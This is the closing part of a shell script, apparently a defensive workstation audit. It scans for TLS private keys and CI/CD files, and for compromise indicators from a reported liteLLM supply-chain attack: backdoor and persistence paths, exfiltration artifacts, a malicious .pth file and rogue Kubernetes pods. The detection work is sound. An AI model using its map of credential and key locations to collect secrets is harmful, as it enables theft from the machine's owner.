# =============================================================================
# SECTION 11: SSL/TLS PRIVATE KEYS & CI/CD CONFIG
# =============================================================================

section_header "11. SSL/TLS KEYS & CI/CD CONFIGURATION"

if [ -d "/etc/ssl/private" ]; then
    ssl_count=$(find /etc/ssl/private -type f 2>/dev/null | wc -l | tr -d ' ')
    if [ "$ssl_count" -gt 0 ]; then
        add_finding "critical" "ssl" \
            "System SSL private keys ($ssl_count files)" \
            "/etc/ssl/private/" \
            "Attacker can impersonate your servers, perform man-in-the-middle attacks on TLS" \
            "Restrict access, consider using ACME with auto-rotation"
    fi
else
    add_finding "safe" "ssl" \
        "No system SSL private keys directory" \
        "" "" ""
fi

if [ -d "/etc/letsencrypt/live" ]; then
    le_count=$(find /etc/letsencrypt/live -name "privkey.pem" 2>/dev/null | wc -l | tr -d ' ')
    if [ "$le_count" -gt 0 ]; then
        add_finding "exposed" "ssl" \
            "Let's Encrypt private keys ($le_count domain(s))" \
            "/etc/letsencrypt/live/" \
            "Attacker can impersonate your domains until certificates expire (90 days)" \
            ""
    fi
else
    add_finding "safe" "ssl" \
        "No Let's Encrypt certificates" \
        "" "" ""
fi

# CI/CD configs in current directory
CI_FOUND=false
for ci_file in "terraform.tfvars" ".gitlab-ci.yml" ".travis.yml" "Jenkinsfile" ".drone.yml" "ansible.cfg"; do
    if [ -f "$ci_file" ]; then
        CI_FOUND=true
        add_finding "warning" "cicd" \
            "$ci_file in current directory" \
            "$(pwd)/$ci_file — may contain embedded secrets or reveal infrastructure" \
            "" ""
    fi
done


# =============================================================================
# SECTION 12: ACTIVE COMPROMISE INDICATORS
# =============================================================================

section_header "12. LITELLM MALWARE — Active Compromise Check"

printf "  ${DIM}Checking for TeamPCP persistence mechanisms and exfiltration artifacts.${NC}\n"
printf "  ${DIM}If ANY of these are found, treat this machine as compromised.${NC}\n\n"

COMPROMISED=false

# Backdoor script
if [ -f "$HOME/.config/sysmon/sysmon.py" ]; then
    COMPROMISED=true
    add_finding "critical" "ioc" \
        "BACKDOOR FOUND: sysmon.py persistence script" \
        "$HOME/.config/sysmon/sysmon.py" \
        "This is the TeamPCP persistent backdoor. It phones home for additional payloads." \
        "Disconnect from network. Begin incident response. See github.com/BerriAI/litellm/issues/24512"
else
    add_finding "safe" "ioc" "No sysmon backdoor found" "" "" ""
fi

# Systemd persistence
if [ -f "$HOME/.config/systemd/user/sysmon.service" ]; then
    COMPROMISED=true
    add_finding "critical" "ioc" \
        "PERSISTENCE FOUND: sysmon.service (survives reboots)" \
        "$HOME/.config/systemd/user/sysmon.service" \
        "Registered as 'System Telemetry Service' — disguised as legitimate monitoring" \
        "systemctl --user disable sysmon.service && rm the file. Then full incident response."
else
    add_finding "safe" "ioc" "No sysmon persistence service found" "" "" ""
fi

# Exfiltration artifacts
if [ -f "/tmp/tpcp.tar.gz" ] || [ -f "/tmp/session.key" ] || [ -f "/tmp/payload.enc" ] || [ -f "/tmp/session.key.enc" ]; then
    COMPROMISED=true
    add_finding "critical" "ioc" \
        "EXFILTRATION ARTIFACTS in /tmp/" \
        "tpcp.tar.gz / session.key / payload.enc found" \
        "The malware's encrypted exfiltration bundle was not cleaned up" \
        "Immediate incident response required"
else
    add_finding "safe" "ioc" "No exfiltration artifacts in /tmp/" "" "" ""
fi

# Malicious .pth file — search known Python site-packages locations only (not full filesystem)
printf "  ${DIM}Note: .pth scan checks common Python install locations (system, Homebrew, pyenv,${NC}\n"
printf "  ${DIM}conda, user installs). Custom or deeply nested virtualenvs may not be covered.${NC}\n\n"

PTH_FOUND=""
for pth_glob in \
    "/usr/local/lib/python*/site-packages/litellm_init.pth" \
    "/usr/lib/python*/site-packages/litellm_init.pth" \
    "/opt/homebrew/lib/python*/site-packages/litellm_init.pth" \
    "/Library/Python/*/lib/python/site-packages/litellm_init.pth" \
    "$HOME/Library/Python/*/lib/python/site-packages/litellm_init.pth" \
    "$HOME/.local/lib/python*/site-packages/litellm_init.pth" \
    "$HOME/.pyenv/versions/*/lib/python*/site-packages/litellm_init.pth" \
    "$HOME/miniforge*/lib/python*/site-packages/litellm_init.pth" \
    "$HOME/miniforge*/envs/*/lib/python*/site-packages/litellm_init.pth" \
    "$HOME/anaconda*/lib/python*/site-packages/litellm_init.pth" \
    "$HOME/anaconda*/envs/*/lib/python*/site-packages/litellm_init.pth" \
    "$HOME/miniconda*/lib/python*/site-packages/litellm_init.pth" \
    "$HOME/miniconda*/envs/*/lib/python*/site-packages/litellm_init.pth"; do
    for match in $pth_glob; do
        [ -f "$match" ] && PTH_FOUND="$PTH_FOUND
$match"
    done
done
PTH_FOUND=$(echo "$PTH_FOUND" | grep -v '^$' | sort -u | head -5 || true)

if [ -n "$PTH_FOUND" ]; then
    COMPROMISED=true
    add_finding "critical" "ioc" \
        "MALICIOUS .pth FILE FOUND (executes on every Python invocation)" \
        "$PTH_FOUND" \
        "Every time Python starts, this file runs the credential stealer again" \
        "Delete immediately. Recreate virtual environments from scratch. Rotate ALL credentials."
else
    add_finding "safe" "ioc" "No litellm_init.pth found in known Python locations" "" "" ""
fi

# Kubernetes backdoor pods
if command -v kubectl >/dev/null 2>&1; then
    NODE_SETUP_PODS=$(kubectl get pods -n kube-system 2>/dev/null | grep "node-setup-" || true)
    if [ -n "$NODE_SETUP_PODS" ]; then
        COMPROMISED=true
        add_finding "critical" "ioc" \
            "LATERAL MOVEMENT: node-setup-* pods in kube-system namespace" \
            "The malware deployed privileged pods to install backdoors on every node" \
            "Every node in the cluster may be compromised" \
            "Full cluster incident response required"
    fi
fi

if [ "$COMPROMISED" = true ]; then
    printf "\n  ${RED}${BOLD}╔═══════════════════════════════════════════════════════════╗${NC}\n"
    printf "  ${RED}${BOLD}║  !! ACTIVE COMPROMISE DETECTED !!                        ║${NC}\n"
    printf "  ${RED}${BOLD}║  1. Disconnect from the network immediately               ║${NC}\n"
    printf "  ${RED}${BOLD}║  2. Do not just delete files — begin full incident response║${NC}\n"
    printf "  ${RED}${BOLD}║  3. Rotate ALL credentials that existed on this machine    ║${NC}\n"
    printf "  ${RED}${BOLD}║  4. Check: github.com/BerriAI/litellm/issues/24512        ║${NC}\n"
    printf "  ${RED}${BOLD}╚═══════════════════════════════════════════════════════════╝${NC}\n\n"
fi


# =============================================================================
# SUMMARY
# =============================================================================

printf "\n"
printf "${BOLD}╔═══════════════════════════════════════════════════════════════╗${NC}\n"
printf "${BOLD}║  AUDIT SUMMARY                                              ║${NC}\n"
printf "${BOLD}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
printf "\n"
printf "  Total checks:    ${BOLD}%s${NC}\n" "$TOTAL_CHECKS"
printf "  ${RED}${BOLD}Critical:${NC}        %s   ${DIM}(immediate action required)${NC}\n" "$CRITICAL_COUNT"
printf "  ${RED}Exposed:${NC}         %s   ${DIM}(attacker gets usable secrets)${NC}\n" "$EXPOSED_COUNT"
printf "  ${YELLOW}Warning:${NC}         %s   ${DIM}(information leakage or missing hardening)${NC}\n" "$WARNING_COUNT"
printf "  ${GREEN}Safe:${NC}            %s   ${DIM}(not found or properly protected)${NC}\n" "$SAFE_COUNT"

RISK_SCORE=$((CRITICAL_COUNT * 10 + EXPOSED_COUNT * 5 + WARNING_COUNT * 1))

printf "\n"
if [ "$RISK_SCORE" -eq 0 ]; then
    printf "  ${GREEN}${BOLD}RISK: MINIMAL${NC}\n"
    printf "  ${DIM}Your workstation has very low exposure to supply chain credential theft.${NC}\n"
elif [ "$RISK_SCORE" -le 10 ]; then
    printf "  ${YELLOW}${BOLD}RISK: MODERATE${NC} (score: %s)\n" "$RISK_SCORE"
    printf "  ${DIM}Some exposure exists. Review findings above and prioritise critical items.${NC}\n"
elif [ "$RISK_SCORE" -le 30 ]; then
    printf "  ${RED}${BOLD}RISK: HIGH${NC} (score: %s)\n" "$RISK_SCORE"
    printf "  ${DIM}Significant exposure. A supply chain attack would compromise multiple credentials.${NC}\n"
else
    printf "  ${RED}${BOLD}RISK: CRITICAL${NC} (score: %s)\n" "$RISK_SCORE"
    printf "  ${DIM}Severe exposure. A single malicious pip install could exfiltrate everything.${NC}\n"
fi

if [ "$CRITICAL_COUNT" -gt 0 ] || [ "$EXPOSED_COUNT" -gt 0 ]; then
    printf "\n"
    printf "${BOLD}═══════════════════════════════════════════════════════════════${NC}\n"
    printf "${BOLD}  THE PATTERN THAT FIXES MOST OF THIS                         ${NC}\n"
    printf "${BOLD}═══════════════════════════════════════════════════════════════${NC}\n"
    printf "\n"
    printf "  ${BOLD}1. Never store long-lived secrets in plaintext files${NC}\n"
    printf "     ${DIM}Use a credential manager: 1Password CLI, aws-vault, or Keychain${NC}\n\n"
    printf "  ${BOLD}2. Never export secrets in shell configuration${NC}\n"
    printf "     ${DIM}Use per-process injection: op run, aws-vault exec, env -S${NC}\n\n"
    printf "  ${BOLD}3. Passphrase-protect all SSH keys and integrate with Keychain${NC}\n"
    printf "     ${DIM}ssh-keygen -p to add passphrase, UseKeychain yes in ~/.ssh/config${NC}\n\n"
    printf "  ${BOLD}4. Use short-lived credentials wherever possible${NC}\n"
    printf "     ${DIM}AWS SSO, GCP ADC with user credentials, exec-based kubeconfig${NC}\n\n"
    printf "  ${BOLD}The principle:${NC} encrypted at rest, decrypted only in memory,\n"
    printf "  mediated by a trusted process. Never plaintext. Never permanent.\n"
fi

printf "\n"
printf "${DIM}  Inspired by the TeamPCP liteLLM attack (github.com/BerriAI/litellm/issues/24512)${NC}\n"
printf "${DIM}  This script ran entirely locally. No data left your machine.${NC}\n"
printf "${DIM}  github.com/Command-N/workstation-exposure-audit — MIT License${NC}\n"
printf "\n"
